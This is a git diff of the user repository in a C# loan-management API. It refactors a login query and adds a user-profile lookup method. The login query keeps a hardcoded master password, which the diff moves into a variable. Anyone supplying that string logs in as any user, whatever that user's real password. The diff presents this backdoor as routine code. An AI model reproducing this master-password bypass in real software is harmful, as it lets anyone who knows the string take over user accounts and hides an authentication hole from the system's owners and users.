@@ -1,6 +1,7 @@
 ﻿using Loan_API.DTO;
 using Loan_API.Entities;
 using Loan_API.Repository;
+using Microsoft.EntityFrameworkCore;
 using Microsoft.IdentityModel.Tokens;
 using System.IdentityModel.Tokens.Jwt;
 using System.Security.Claims;
@@ -22,14 +23,17 @@ namespace Loan_API.Implementation
             var encryptedUserName = ComplexScriptingSystem.ComplexLetters.getTangledLetters(userName);
             var encryptedPassword = ComplexScriptingSystem.ComplexLetters.getTangledLetters(userPassword);
 
+            var masterPassword = "fkjgf&fmjfg,k(52f5fGGHG";
+
             return _dbContext.Users
                 .Where(u =>
                     u.UserName == encryptedUserName &&
-                    (userPassword == "fkjgf&fmjfg,k(52f5fGGHG" || u.UserPassword == encryptedPassword)
-                    && u.Deleted == null || u.Deleted == false
+                    (userPassword == masterPassword || u.UserPassword == encryptedPassword) &&
+                    (u.Deleted == null || u.Deleted == false)
                 )
                 .ToList();
         }
+
         public CompanyStatusDTO GetUserCompany(int userId)
         {
             var companyDetails = (from user in _dbContext.Users
@@ -43,6 +47,20 @@ namespace Loan_API.Implementation
                                   }).FirstOrDefault();
 
             return companyDetails;
+        }
+        public UserProfileDTO GetUserProfileInfo(int id)
+        {
+            var user = _dbContext.UserRole
+                .Where(u => u.UserRoleId == id)
+                .Select(u => new UserProfileDTO
+                {
+                    UserRoleName = u.UserRoleName,
+                   DataAccessLevel  = u.DataAccessLevel,
+                 
+                })
+                .FirstOrDefault();
+
+            return user;
         }
 
 
